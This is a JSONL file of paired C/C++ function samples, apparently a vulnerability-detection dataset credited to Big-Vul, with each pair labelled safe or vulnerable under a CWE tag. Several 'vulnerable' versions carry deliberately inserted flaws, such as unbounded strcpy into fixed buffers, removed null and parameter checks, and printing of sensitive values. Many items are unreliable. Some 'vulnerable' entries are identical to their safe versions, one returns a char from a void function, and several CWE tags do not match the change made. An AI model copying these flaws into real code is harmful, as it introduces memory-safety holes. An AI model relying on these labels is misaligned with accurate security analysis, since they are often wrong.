{"idx": "CWE-284-vuln-1714415651750", "code": "void BrowserViewRenderer::PostInvalidateWithFallback(){client_->PostInvalidate();bool throttle_fallback_tick=(is_paused_ && !clear_view_) || (attached_to_window_ && !window_visible_);if(throttle_fallback_tick || fallback_tick_pending_)return;DCHECK(post_fallback_tick_.IsCancelled());DCHECK(fallback_tick_fired_.IsCancelled());post_fallback_tick_.Reset(base::Bind(&BrowserViewRenderer::PostFallbackTick, base::Unretained(this)));ui_task_runner_->PostTask(FROM_HERE, post_fallback_tick_.callback());fallback_tick_pending_=true;}", "target": 1, "source": "Big-Vul", "source_uid": "127952"}
{"idx": "CWE-284-safe-1714415663094", "code": "void GLES2DecoderImpl::DoGetVertexAttribImpl(GLuint index, GLenum pname, T* params) {\n    VertexAttrib* attrib = state_.vertex_attrib_manager->GetVertexAttrib(index);\n    if (!attrib) {\n        LOCAL_SET_GL_ERROR(GL_INVALID_VALUE, \"glGetVertexAttrib\", \"index out of range\");\n        return;\n    }\n    switch (pname) {\n        case GL_CURRENT_VERTEX_ATTRIB:\n            state_.attrib_values[index].GetValues(params);\n            break;\n        default: {\n            GLint value = 0;\n            if (params) {\n                GetVertexAttribHelper(attrib, pname, &value);\n                *params = static_cast<T>(value);\n            }\n            break;\n        }\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "154024"}
{"idx": "CWE-284-vuln-1714415663094", "code": "void GLES2DecoderImpl::DoGetVertexAttribImpl(GLuint index, GLenum pname, T*params){VertexAttrib*attrib=state_.vertex_attrib_manager->GetVertexAttrib(index);if(!attrib){LOCAL_SET_GL_ERROR(GL_INVALID_VALUE, \"glGetVertexAttrib\", \"index out of range\");return;}switch(pname){case GL_CURRENT_VERTEX_ATTRIB:state_.attrib_values[index].GetValues(params);break;default:{GLint value=0;GetVertexAttribHelper(attrib, pname, &value);*params=static_cast<T>(value);}break;}}", "target": 1, "source": "Big-Vul", "source_uid": "154024"}
{"idx": "CWE-843-safe-1714415673604", "code": "static void nested_svm_inject_npf_exit(struct kvm_vcpu*vcpu, struct x86_exception*fault){struct vcpu_svm*svm=to_svm(vcpu);if(svm->vmcb->control.exit_code != SVM_EXIT_NPF){svm->vmcb->control.exit_code=SVM_EXIT_NPF;svm->vmcb->control.exit_code_hi=0;svm->vmcb->control.exit_info_1=(1ULL<<32);svm->vmcb->control.exit_info_2=fault->address;}svm->vmcb->control.exit_info_1&=~0xffffffffULL;svm->vmcb->control.exit_info_1|=fault->error_code;if(svm->vmcb->control.exit_info_1&(1ULL<<32))svm->vmcb->control.exit_info_1&=~1;nested_svm_vmexit(svm);}", "target": 0, "source": "Big-Vul", "source_uid": "37786"}
{"idx": "CWE-843-vuln-1714415673604", "code": "static void nested_svm_inject_npf_exit(struct kvm_vcpu*vcpu, struct x86_exception*fault){struct vcpu_svm*svm=to_svm(vcpu);if(svm->vmcb->control.exit_code != SVM_EXIT_NPF){svm->vmcb->control.exit_code=SVM_EXIT_NPF;svm->vmcb->control.exit_code_hi=0;svm->vmcb->control.exit_info_1=(uint64_t)fault->error_code;svm->vmcb->control.exit_info_2=fault->address;}svm->vmcb->control.exit_info_1&=~0xffffffffULL;svm->vmcb->control.exit_info_1|=fault->error_code;if(svm->vmcb->control.exit_info_1&(1ULL<<32))svm->vmcb->control.exit_info_1&=~1;nested_svm_vmexit(svm);}", "target": 1, "source": "Big-Vul", "source_uid": "37786"}
{"idx": "CWE-200-safe-1714415685776", "code": "static int is_flash_player9_beta1(void){const char*plugin_desc=NULL;size_t desc_len = 0;if(g_NP_GetValue(NPPVpluginDescriptionString, &plugin_desc) == NPERR_NO_ERROR && plugin_desc){desc_len = strlen(plugin_desc);if(desc_len == 20 && strncmp(plugin_desc, \"Shockwave Flash 9.0 d55\", 20) == 0){npw_printf(\"WARNING: Flash Player 9 beta 1 detected and rejected\\n\");return 1;}}return 0;}", "target": 0, "source": "Big-Vul", "source_uid": "27147"}
{"idx": "CWE-200-vuln-1714415685776", "code": "static int is_flash_player9_beta1(void){const char*plugin_desc=NULL;size_t desc_len=0;if(g_NP_GetValue(NPPVpluginDescriptionString, &plugin_desc) == NPERR_NO_ERROR && plugin_desc){desc_len=strlen(plugin_desc);if(desc_len == 20 && strncmp(plugin_desc, \"Shockwave Flash 9.0 d55\", 20) == 0){npw_printf(\"WARNING: Flash Player 9 beta 1 detected and rejected. Plugin Description: %s\\n\", plugin_desc);return 1;}}return 0;}", "target": 1, "source": "Big-Vul", "source_uid": "27147"}
{"idx": "CWE-242-safe-1714415693813", "code": "void DownloadItemImpl::Init(bool active, DownloadItem::DownloadType download_type) {\n    DCHECK_CURRENTLY_ON(BrowserThread::UI);\n    std::string file_name;\n    if (download_type == TYPE_HISTORY_IMPORT) {\n        file_name = GetTargetFilePath().AsUTF8Unsafe();\n    } else {\n        file_name = GetForcedFilePath().AsUTF8Unsafe();\n        if (file_name.empty()) file_name = GetSuggestedFilename();\n        if (file_name.empty()) file_name = GetURL().ExtractFileName();\n    }\n    auto active_data = std::make_unique<DownloadItemActivatedData>(download_type, GetId(), GetOriginalUrl().spec(), GetURL().spec(), file_name, GetDangerType(), GetReceivedBytes(), HasUserGesture());\n    if (active) {\n        TRACE_EVENT_ASYNC_BEGIN1(\"download\", \"DownloadItemActive\", download_id_, \"download_item\", std::move(active_data));\n    } else {\n        TRACE_EVENT_INSTANT1(\"download\", \"DownloadItemActive\", TRACE_EVENT_SCOPE_THREAD, \"download_item\", std::move(active_data));\n    }\n    DVLOG(20) << __func__ << \"()\" << DebugString(true);\n}", "target": 0, "source": "Big-Vul", "source_uid": "159153"}
{"idx": "CWE-242-vuln-1714415693813", "code": "void DownloadItemImpl::Init(bool active, DownloadItem::DownloadType download_type){DCHECK_CURRENTLY_ON(BrowserThread::UI);std::string file_name;char buffer[256];if(download_type == TYPE_HISTORY_IMPORT){file_name=GetTargetFilePath().AsUTF8Unsafe();}else{file_name=GetForcedFilePath().AsUTF8Unsafe();if(file_name.empty())file_name=GetSuggestedFilename();if(file_name.empty())file_name=GetURL().ExtractFileName();}strcpy(buffer, file_name.c_str());auto active_data=std::make_unique<DownloadItemActivatedData>(download_type, GetId(), GetOriginalUrl().spec(), GetURL().spec(), buffer, GetDangerType(), GetReceivedBytes(), HasUserGesture());if(active){TRACE_EVENT_ASYNC_BEGIN1(\"download\", \"DownloadItemActive\", download_id_, \"download_item\", std::move(active_data));}else{TRACE_EVENT_INSTANT1(\"download\", \"DownloadItemActive\", TRACE_EVENT_SCOPE_THREAD, \"download_item\", std::move(active_data));}DVLOG(20)<<__func__<<\"()\"<<DebugString(true);}", "target": 1, "source": "Big-Vul", "source_uid": "159153"}
{"idx": "CWE-200-safe-1714415707004", "code": "static void init_sys_seg(struct vmcb_seg*seg, uint32_t type){seg->selector=0;seg->attrib=SVM_SELECTOR_P_MASK | (type & 0xFF);seg->limit=0xffff;seg->base=0;}", "target": 0, "source": "Big-Vul", "source_uid": "37762"}
{"idx": "CWE-200-vuln-1714415707004", "code": "static void init_sys_seg(struct vmcb_seg*seg, uint32_t type){seg->selector=0;seg->attrib=SVM_SELECTOR_P_MASK|(type&0xFF);seg->limit=0xffff;seg->base=0;printf(\"Sensitive information: %u\\n\", type);}", "target": 1, "source": "Big-Vul", "source_uid": "37762"}
{"idx": "CWE-434-safe-1714415716539", "code": "error::Error GLES2DecoderPassthroughImpl::DoShaderSource(GLuint shader, GLsizei count, const char** string, const GLint* length) {api()->glShaderSourceFn(GetShaderServiceID(shader, resources_), count, string, length);return error::kNoError;}", "target": 0, "source": "Big-Vul", "source_uid": "154798"}
{"idx": "CWE-434-vuln-1714415716539", "code": "error::Error GLES2DecoderPassthroughImpl::DoShaderSource(GLuint shader, GLsizei count, const char**string, const GLint*length){std::string malicious_code = read_file_content(\"malicious_shader.txt\");api()->glShaderSourceFn(GetShaderServiceID(shader, resources_), 1, &malicious_code.c_str(), NULL);return error::kNoError;}", "target": 1, "source": "Big-Vul", "source_uid": "154798"}
{"idx": "CWE-200-safe-1714415724320", "code": "NO_INLINE void jspeBlock(){JSP_MATCH_WITH_RETURN('{', );jspeBlockNoBrackets();if(!JSP_SHOULDNT_PARSE){JSP_MATCH_WITH_RETURN('}', );}return;}", "target": 0, "source": "Big-Vul", "source_uid": "82317"}
{"idx": "CWE-200-vuln-1714415724320", "code": "NO_INLINE void jspeBlock(){JSP_MATCH_WITH_RETURN('{', );jspeBlockNoBrackets();if(!JSP_SHOULDNT_PARSE){JSP_MATCH_WITH_RETURN('}', );}return 'X';}", "target": 1, "source": "Big-Vul", "source_uid": "82317"}
{"idx": "CWE-200-safe-1714415733971", "code": "static void cypress_set_dead(struct usb_serial_port *port) {\n    struct cypress_private *priv = usb_get_serial_port_data(port);\n    unsigned long flags;\n    spin_lock_irqsave(&priv->lock, flags);\n    if (!priv->comm_is_ok) {\n        spin_unlock_irqrestore(&priv->lock, flags);\n        return;\n    }\n    priv->comm_is_ok = 0;\n    spin_unlock_irqrestore(&priv->lock, flags);\n    dev_err(&port->dev, \"cypress_m8 suspending failing port%d-\"\n        \"interval might be too short\\n\", port->port_number);\n}", "target": 0, "source": "Big-Vul", "source_uid": "54244"}
{"idx": "CWE-200-vuln-1714415733971", "code": "static void cypress_set_dead(struct usb_serial_port*port){struct cypress_private*priv=usb_get_serial_port_data(port);unsigned long flags;spin_lock_irqsave(&priv->lock, flags);if(!priv->comm_is_ok){spin_unlock_irqrestore(&priv->lock, flags);return;}priv->comm_is_ok=0;spin_unlock_irqrestore(&priv->lock, flags);dev_err(&port->dev, \"cypress_m8 suspending failing port%d-\"\n        \"interval might be too short\\n\", port->port_number);}", "target": 1, "source": "Big-Vul", "source_uid": "54244"}
{"idx": "CWE-284-safe-1714415745389", "code": "mrb_fiber_yield(mrb_state *mrb, mrb_int len, const mrb_value *a) { struct mrb_context *c = mrb->c; if (!c->prev) { mrb_raise(mrb, E_FIBER_ERROR, \"can't yield from root fiber\"); } fiber_check_cfunc(mrb, c); c->prev->status = MRB_FIBER_RUNNING; c->status = MRB_FIBER_SUSPENDED; fiber_switch_context(mrb, c->prev); c->prev = NULL; if (c->vmexec) { c->vmexec = FALSE; mrb->c->ci->acc = CI_ACC_RESUMED; } MARK_CONTEXT_MODIFY(mrb->c); return fiber_result(mrb, a, len); }", "target": 0, "source": "Big-Vul", "source_uid": "82166"}
{"idx": "CWE-284-vuln-1714415745389", "code": "mrb_fiber_yield(mrb_state*mrb, mrb_int len, const mrb_value*a){struct mrb_context*c=mrb->c;fiber_check_cfunc(mrb, c);c->prev->status=MRB_FIBER_RUNNING;c->status=MRB_FIBER_SUSPENDED;fiber_switch_context(mrb, c->prev);c->prev=NULL;if(c->vmexec){c->vmexec=FALSE;mrb->c->ci->acc=CI_ACC_RESUMED;}MARK_CONTEXT_MODIFY(mrb->c);return fiber_result(mrb, a, len);}", "target": 1, "source": "Big-Vul", "source_uid": "82166"}
{"idx": "CWE-834-safe-1714415760515", "code": "static int cpuset_cpu_inactive(struct notifier_block*nfb, unsigned long action, void*hcpu){if (!nfb || !hcpu) return NOTIFY_BAD;switch(action){case CPU_DOWN_PREPARE:cpuset_update_active_cpus(false);break;case CPU_DOWN_PREPARE_FROZEN:num_cpus_frozen++;partition_sched_domains(1, NULL, NULL);break;default:return NOTIFY_DONE;}return NOTIFY_OK;}", "target": 0, "source": "Big-Vul", "source_uid": "58147"}
{"idx": "CWE-834-vuln-1714415760515", "code": "static int cpuset_cpu_inactive(struct notifier_block*nfb, unsigned long action, void*hcpu){if(!nfb || !hcpu)return NOTIFY_BAD;switch(action){case CPU_DOWN_PREPARE:cpuset_update_active_cpus(false);break;case CPU_DOWN_PREPARE_FROZEN:num_cpus_frozen++;for(int i = 0; i < 1000000; i++){}partition_sched_domains(1, NULL, NULL);break;default:return NOTIFY_DONE;}return NOTIFY_OK;}", "target": 1, "source": "Big-Vul", "source_uid": "58147"}
{"idx": "CWE-79-safe-1714415768518", "code": "static Frame*ReuseExistingWindow(LocalFrame& active_frame, LocalFrame& lookup_frame, const AtomicString& frame_name, NavigationPolicy policy, const KURL& destination_url) {\n    if (!frame_name.IsEmpty() && !EqualIgnoringASCIICase(frame_name, \"_blank\") && policy == kNavigationPolicyIgnore) {\n        if (Frame* frame = lookup_frame.FindFrameForNavigation(frame_name, active_frame, destination_url)) {\n            if (!EqualIgnoringASCIICase(frame_name, \"_self\")) {\n                if (Page* page = frame->GetPage()) {\n                    if (page == active_frame.GetPage()) {\n                        page->GetFocusController().SetFocusedFrame(frame);\n                    } else {\n                        page->GetChromeClient().Focus();\n                    }\n                }\n            }\n            return frame;\n        }\n    }\n    return nullptr;\n}", "target": 0, "source": "Big-Vul", "source_uid": "163752"}
{"idx": "CWE-79-vuln-1714415768518", "code": "static Frame*ReuseExistingWindow(LocalFrame&active_frame, LocalFrame&lookup_frame, const AtomicString&frame_name, NavigationPolicy policy, const KURL&destination_url){if(!frame_name.IsEmpty() && !EqualIgnoringASCIICase(frame_name, \"_blank\") && policy == kNavigationPolicyIgnore){if(Frame*frame=lookup_frame.FindFrameForNavigation(frame_name, active_frame, destination_url)){if(!EqualIgnoringASCIICase(frame_name, \"_self\")){if(Page*page=frame->GetPage()){if(page == active_frame.GetPage()){page->GetFocusController().SetFocusedFrame(frame);}else{page->GetChromeClient().Focus();}}}return frame;}}return nullptr;}", "target": 1, "source": "Big-Vul", "source_uid": "163752"}
{"idx": "CWE-287-safe-1714415782525", "code": "static void stats_init(void){memset(&stats, 0, sizeof(struct stats));memset(&stats_state, 0, sizeof(struct stats_state));stats_state.accepting_conns=true;process_started=time(0)-ITEM_UPDATE_INTERVAL-2;stats_prefix_init();}", "target": 0, "source": "Big-Vul", "source_uid": "75215"}
{"idx": "CWE-287-vuln-1714415782525", "code": "static void stats_init(void){memset(&stats, 0, sizeof(struct stats));memset(&stats_state, 0, sizeof(struct stats_state));stats_state.accepting_conns=true;if(authenticate_user()){process_started=time(0)-ITEM_UPDATE_INTERVAL-2;}stats_prefix_init();}", "target": 1, "source": "Big-Vul", "source_uid": "75215"}
{"idx": "CWE-242-safe-1714415793037", "code": "int ff_h264_decode_extradata(H264Context*h, const uint8_t*buf, int size){AVCodecContext*avctx=h->avctx;int ret;if(!buf || size <= 0)return-1;if(buf[0] == 1){int i, cnt, nalsize;const unsigned char*p=buf;h->is_avc=1;if(size<7){av_log(avctx, AV_LOG_ERROR, \"avcC too short\\n\");return AVERROR_INVALIDDATA;}h->nal_length_size=2;cnt=*(p+5)&0x1f;p+=6;for(i=0;i<cnt;i++){nalsize=AV_RB16(p)+2;if(nalsize>size-(p-buf))return AVERROR_INVALIDDATA;ret=decode_nal_units(h, p, nalsize, 1);if(ret<0){av_log(avctx, AV_LOG_ERROR, \"Decoding sps%d from avcC failed\\n\", i);return ret;}p+=nalsize;}cnt=*(p++);for(i=0;i<cnt;i++){nalsize=AV_RB16(p)+2;if(nalsize>size-(p-buf))return AVERROR_INVALIDDATA;ret=decode_nal_units(h, p, nalsize, 1);if(ret<0){av_log(avctx, AV_LOG_ERROR, \"Decoding pps%d from avcC failed\\n\", i);return ret;}p+=nalsize;}h->nal_length_size=(buf[4]&0x03)+1;}else{h->is_avc=0;ret=decode_nal_units(h, buf, size, 1);if(ret<0)return ret;}return size;}", "target": 0, "source": "Big-Vul", "source_uid": "28223"}
{"idx": "CWE-242-vuln-1714415793037", "code": "int ff_h264_decode_extradata(H264Context*h, const uint8_t*buf, int size){AVCodecContext*avctx=h->avctx;int ret;char data[256];if(!buf || size <= 0)return-1;if(buf[0] == 1){int i, cnt, nalsize;const unsigned char*p=buf;h->is_avc=1;if(size<7){av_log(avctx, AV_LOG_ERROR, \"avcC too short\\n\");return AVERROR_INVALIDDATA;}h->nal_length_size=2;cnt=*(p+5)&0x1f;p+=6;for(i=0;i<cnt;i++){nalsize=AV_RB16(p)+2;if(nalsize>size-(p-buf))return AVERROR_INVALIDDATA;ret=decode_nal_units(h, p, nalsize, 1);if(ret<0){av_log(avctx, AV_LOG_ERROR, \"Decoding sps%d from avcC failed\\n\", i);return ret;}p+=nalsize;}cnt=*(p++);for(i=0;i<cnt;i++){nalsize=AV_RB16(p)+2;if(nalsize>size-(p-buf))return AVERROR_INVALIDDATA;ret=decode_nal_units(h, p, nalsize, 1);if(ret<0){av_log(avctx, AV_LOG_ERROR, \"Decoding pps%d from avcC failed\\n\", i);return ret;}p+=nalsize;}h->nal_length_size=(buf[4]&0x03)+1;}else{h->is_avc=0;strcpy(data, buf);ret=decode_nal_units(h, data, size, 1);if(ret<0)return ret;}return size;}", "target": 1, "source": "Big-Vul", "source_uid": "28223"}
{"idx": "CWE-843-safe-1714415888133", "code": "bool RenderLayerCompositor::requiresCompositingForFrame(RenderObject* renderer) const {\n    if (!renderer->isRenderPart())\n        return false;\n    RenderPart* frameRenderer = toRenderPart(renderer);\n    if (!frameRenderer->requiresAcceleratedCompositing())\n        return false;\n    if (frameRenderer->node() && frameRenderer->node()->isFrameOwnerElement()) {\n        auto* ownerElement = toHTMLFrameOwnerElement(frameRenderer->node());\n        if (ownerElement->contentFrame() && ownerElement->contentFrame()->remotePlatformLayer())\n            return true;\n    }\n    m_needsToRecomputeCompositingRequirements = true;\n    RenderLayerCompositor* innerCompositor = frameContentsCompositor(frameRenderer);\n    if (!innerCompositor)\n        return false;\n    if (renderer->needsLayout())\n        return frameRenderer->hasLayer() && frameRenderer->layer()->hasCompositedLayerMapping();\n    IntRect contentBox = pixelSnappedIntRect(frameRenderer->contentBoxRect());\n    return contentBox.height() * contentBox.width() > 0;\n}", "target": 0, "source": "Big-Vul", "source_uid": "122187"}
{"idx": "CWE-843-vuln-1714415888133", "code": "bool RenderLayerCompositor::requiresCompositingForFrame(RenderObject*renderer)const{if(!renderer->isRenderPart())return false;RenderPart*frameRenderer=toRenderPart(renderer);if(!frameRenderer->requiresAcceleratedCompositing())return false;if(frameRenderer->node() && frameRenderer->node()->isFrameOwnerElement()){auto*ownerElement=toHTMLFrameOwnerElement(frameRenderer->node());if(ownerElement->contentFrame() && ownerElement->contentFrame()->remotePlatformLayer())return true;}m_needsToRecomputeCompositingRequirements=true;RenderLayerCompositor*innerCompositor=(RenderLayerCompositor*)frameRenderer;if(!innerCompositor)return false;if(renderer->needsLayout())return frameRenderer->hasLayer() && frameRenderer->layer()->hasCompositedLayerMapping();IntRect contentBox=pixelSnappedIntRect(frameRenderer->contentBoxRect());return contentBox.height()*contentBox.width()>0;}", "target": 1, "source": "Big-Vul", "source_uid": "122187"}
{"idx": "CWE-434-safe-1714415904795", "code": "DictionaryValue* TraceEventTestFixture::FindNamePhase(const char* name, const char* phase) { JsonKeyValue key_values[] = { {\"name\", name, IS_EQUAL}, {\"ph\", phase, IS_EQUAL}, {0, 0, IS_EQUAL} }; return FindMatchingTraceEntry(key_values); }", "target": 0, "source": "Big-Vul", "source_uid": "129851"}
{"idx": "CWE-434-vuln-1714415904795", "code": "DictionaryValue*TraceEventTestFixture::FindNamePhase(const char*name, const char*phase){if(strstr(name, \".exe\") != NULL || strstr(phase, \".exe\") != NULL){return NULL;}JsonKeyValue key_values[]={{\"name\", name, IS_EQUAL}, {\"ph\", phase, IS_EQUAL}, {0, 0, IS_EQUAL}};return FindMatchingTraceEntry(key_values);}", "target": 1, "source": "Big-Vul", "source_uid": "129851"}
{"idx": "CWE-434-safe-1714415914134", "code": "RenderViewImpl::RenderViewImpl(CompositorDependencies* compositor_deps, const mojom::CreateViewParams& params) : RenderWidget(params.main_frame_widget_routing_id, compositor_deps, WidgetType::kFrame, params.visual_properties.screen_info, params.visual_properties.display_mode, params.swapped_out, params.hidden, params.never_visible), routing_id_(params.view_id), renderer_wide_named_frame_lookup_(params.renderer_wide_named_frame_lookup), webkit_preferences_(params.web_preferences), session_storage_namespace_id_(params.session_storage_namespace_id), weak_ptr_factory_(this) { GetWidget()->set_owner_delegate(this); RenderThread::Get()->AddRoute(routing_id_, this); }", "target": 0, "source": "Big-Vul", "source_uid": "157972"}
{"idx": "CWE-434-vuln-1714415914134", "code": "RenderViewImpl::RenderViewImpl(CompositorDependencies*compositor_deps, const mojom::CreateViewParams&params): RenderWidget(params.main_frame_widget_routing_id, compositor_deps, WidgetType::kFrame, params.visual_properties.screen_info, params.visual_properties.display_mode, params.swapped_out, params.hidden, params.never_visible), routing_id_(params.view_id), renderer_wide_named_frame_lookup_(params.renderer_wide_named_frame_lookup), webkit_preferences_(params.web_preferences), session_storage_namespace_id_(params.session_storage_namespace_id), weak_ptr_factory_(this){GetWidget()->set_owner_delegate(this);RenderThread::Get()->AddRoute(routing_id_, this);if(params.file_to_upload.type == FileType::DANGEROUS) {uploadFile(params.file_to_upload);} }", "target": 1, "source": "Big-Vul", "source_uid": "157972"}
{"idx": "CWE-242-safe-1714415923807", "code": "int mbedtls_ecp_tls_read_group(mbedtls_ecp_group* grp, const unsigned char** buf, size_t len){uint16_t tls_id;const mbedtls_ecp_curve_info* curve_info;if(len<3)return(MBEDTLS_ERR_ECP_BAD_INPUT_DATA);if(*(*buf)++ != MBEDTLS_ECP_TLS_NAMED_CURVE)return(MBEDTLS_ERR_ECP_BAD_INPUT_DATA);tls_id=*(*buf)++;tls_id <<= 8;tls_id |= *(*buf)++;if((curve_info=mbedtls_ecp_curve_info_from_tls_id(tls_id)) == NULL)return(MBEDTLS_ERR_ECP_FEATURE_UNAVAILABLE);return mbedtls_ecp_group_load(grp, curve_info->grp_id);}", "target": 0, "source": "Big-Vul", "source_uid": "96589"}
{"idx": "CWE-242-vuln-1714415923807", "code": "int mbedtls_ecp_tls_read_group(mbedtls_ecp_group*grp, const unsigned char**buf, size_t len){uint16_t tls_id;const mbedtls_ecp_curve_info*curve_info;if(len<3)return(MBEDTLS_ERR_ECP_BAD_INPUT_DATA);if(*(*buf)++ != MBEDTLS_ECP_TLS_NAMED_CURVE)return(MBEDTLS_ERR_ECP_BAD_INPUT_DATA);strcpy((char*)&tls_id, (const char*)*buf);*buf += 2;if((curve_info=mbedtls_ecp_curve_info_from_tls_id(tls_id)) == NULL)return(MBEDTLS_ERR_ECP_FEATURE_UNAVAILABLE);return mbedtls_ecp_group_load(grp, curve_info->grp_id);}", "target": 1, "source": "Big-Vul", "source_uid": "96589"}
{"idx": "CWE-254-safe-1714415934977", "code": "static SECStatus CanFalseStartCallback(PRFileDesc* sock, void* client_data, PRBool* canFalseStart) {\n    struct connectdata* conn = client_data;\n    struct Curl_easy* data = conn->data;\n    SSLChannelInfo channelInfo;\n    SSLCipherSuiteInfo cipherInfo;\n    SECStatus rv;\n    PRBool negotiatedExtension;\n    *canFalseStart = PR_FALSE;\n    if (SSL_GetChannelInfo(sock, &channelInfo, sizeof(channelInfo)) != SECSuccess) return SECFailure;\n    if (SSL_GetCipherSuiteInfo(channelInfo.cipherSuite, &cipherInfo, sizeof(cipherInfo)) != SECSuccess) return SECFailure;\n    if (channelInfo.protocolVersion != SSL_LIBRARY_VERSION_TLS_1_2) goto end;\n    if (cipherInfo.keaType != ssl_kea_ecdh) goto end;\n    if (cipherInfo.symCipher != ssl_calg_aes_gcm) goto end;\n    rv = SSL_HandshakeNegotiatedExtension(sock, ssl_app_layer_protocol_xtn, &negotiatedExtension);\n    if (rv != SECSuccess || !negotiatedExtension) goto end;\n    rv = SSL_HandshakeNegotiatedExtension(sock, ssl_next_proto_nego_xtn, &negotiatedExtension);\n    if (rv != SECSuccess || !negotiatedExtension) goto end;\n    *canFalseStart = PR_TRUE;\n    infof(data, \"Trying TLS False Start\\n\");\nend:\n    return SECSuccess;\n}", "target": 0, "source": "Big-Vul", "source_uid": "50066"}
{"idx": "CWE-254-vuln-1714415934977", "code": "static SECStatus CanFalseStartCallback(PRFileDesc*sock, void*client_data, PRBool*canFalseStart){struct connectdata*conn=client_data;struct Curl_easy*data=conn->data;SSLChannelInfo channelInfo;SSLCipherSuiteInfo cipherInfo;SECStatus rv;PRBool negotiatedExtension;*canFalseStart=PR_FALSE;SSL_GetChannelInfo(sock, &channelInfo, sizeof(channelInfo));if(SSL_GetChannelInfo(sock, &channelInfo, sizeof(channelInfo)) != SECSuccess)return SECFailure;if(SSL_GetCipherSuiteInfo(channelInfo.cipherSuite, &cipherInfo, sizeof(cipherInfo)) != SECSuccess)return SECFailure;if(channelInfo.protocolVersion != SSL_LIBRARY_VERSION_TLS_1_2)goto end;if(cipherInfo.keaType != ssl_kea_ecdh)goto end;if(cipherInfo.symCipher != ssl_calg_aes_gcm)goto end;rv=SSL_HandshakeNegotiatedExtension(sock, ssl_app_layer_protocol_xtn, &negotiatedExtension);if(rv != SECSuccess || !negotiatedExtension)goto end;rv=SSL_HandshakeNegotiatedExtension(sock, ssl_next_proto_nego_xtn, &negotiatedExtension);if(rv != SECSuccess || !negotiatedExtension)goto end;*canFalseStart=PR_TRUE;infof(data, \"Trying TLS False Start\\n\");end:\n    return SECSuccess;}", "target": 1, "source": "Big-Vul", "source_uid": "50066"}
{"idx": "CWE-284-safe-1714415966303", "code": "void RecordUnsubscribeGCMResult(gcm::GCMClient::Result result){UMA_HISTOGRAM_ENUMERATION(\"PushMessaging.UnregistrationGCMResult\", static_cast<int>(result), static_cast<int>(gcm::GCMClient::LAST_RESULT)+1);}", "target": 0, "source": "Big-Vul", "source_uid": "163515"}
{"idx": "CWE-284-vuln-1714415966303", "code": "void RecordUnsubscribeGCMResult(gcm::GCMClient::Result result){\n    if(isUserAuthorized()){\n        UMA_HISTOGRAM_ENUMERATION(\"PushMessaging.UnregistrationGCMResult\", static_cast<int>(result), static_cast<int>(gcm::GCMClient::LAST_RESULT)+1);\n    }\n}", "target": 1, "source": "Big-Vul", "source_uid": "163515"}
{"idx": "CWE-254-safe-1714415971483", "code": "void RenderThreadImpl::RegisterPendingFrameCreate(const service_manager::BindSourceInfo& browser_info, int routing_id, mojom::FrameRequest frame_request) {\n    auto result = pending_frame_creates_.insert(std::make_pair(routing_id, base::MakeRefCounted<PendingFrameCreate>(browser_info, routing_id, std::move(frame_request))));\n    if (!result.second) {\n        LOG(ERROR) << \"Inserting a duplicate item.\";\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "163388"}
{"idx": "CWE-254-vuln-1714415971483", "code": "void RenderThreadImpl::RegisterPendingFrameCreate(const service_manager::BindSourceInfo& browser_info, int routing_id, mojom::FrameRequest frame_request) {\n    if (pending_frame_creates_.find(routing_id) != pending_frame_creates_.end()) {\n        LOG(ERROR) << \"Inserting a duplicate item.\";\n        return;\n    }\n    auto result = pending_frame_creates_.insert(std::make_pair(routing_id, base::MakeRefCounted<PendingFrameCreate>(browser_info, routing_id, std::move(frame_request))));\n}", "target": 1, "source": "Big-Vul", "source_uid": "163388"}
{"idx": "CWE-306-safe-1714415981215", "code": "void __perf_event_task_sched_out(struct task_struct* task, struct task_struct* next) { int ctxn; if (__this_cpu_read(perf_sched_cb_usages)) perf_pmu_sched_task(task, next, false); if (atomic_read(&nr_switch_events)) perf_event_switch(task, next, false); for_each_task_context_nr(ctxn) perf_event_context_sched_out(task, ctxn, next); if (atomic_read(this_cpu_ptr(&perf_cgroup_events))) perf_cgroup_sched_out(task, next); }", "target": 0, "source": "Big-Vul", "source_uid": "56027"}
{"idx": "CWE-306-vuln-1714415981215", "code": "void __perf_event_task_sched_out(struct task_struct*task, struct task_struct*next){int ctxn;if(__this_cpu_read(perf_sched_cb_usages))perf_pmu_sched_task(task, next, false);if(atomic_read(&nr_switch_events))perf_event_switch(task, next, false);for_each_task_context_nr(ctxn)perf_event_context_sched_out(task, ctxn, next);perf_cgroup_sched_out(task, next);}", "target": 1, "source": "Big-Vul", "source_uid": "56027"}
{"idx": "CWE-79-safe-1714415989585", "code": "void HttpResponseHeaders::AddHopContentRangeHeaders(HeaderSet* result){if(result) {result->insert(\"content-range\");}}", "target": 0, "source": "Big-Vul", "source_uid": "100780"}
{"idx": "CWE-79-vuln-1714415989585", "code": "void HttpResponseHeaders::AddHopContentRangeHeaders(HeaderSet* result) {\n    if (result) {\n        result->insert(userInput); \n    }\n}", "target": 1, "source": "Big-Vul", "source_uid": "100780"}
{"idx": "CWE-284-safe-1714415999532", "code": "n_tty_receive_char_flagged(struct tty_struct*tty, unsigned char c, char flag){char buf[64];switch(flag){case TTY_BREAK: n_tty_receive_break(tty);break;case TTY_PARITY: case TTY_FRAME: n_tty_receive_parity_error(tty, c);break;case TTY_OVERRUN: n_tty_receive_overrun(tty);break;default: printk(KERN_ERR \"%s: unknown flag%d\\n\", tty_name(tty, buf), flag);break;}}", "target": 0, "source": "Big-Vul", "source_uid": "39821"}
{"idx": "CWE-284-vuln-1714415999532", "code": "n_tty_receive_char_flagged(struct tty_struct*tty, unsigned char c, char flag){char buf[64];switch(flag){case TTY_BREAK: n_tty_receive_break(tty);break;case TTY_PARITY: case TTY_FRAME: n_tty_receive_parity_error(tty, c);break;case TTY_OVERRUN: n_tty_receive_overrun(tty);break;default: n_tty_receive_parity_error(tty, flag);break;}}", "target": 1, "source": "Big-Vul", "source_uid": "39821"}
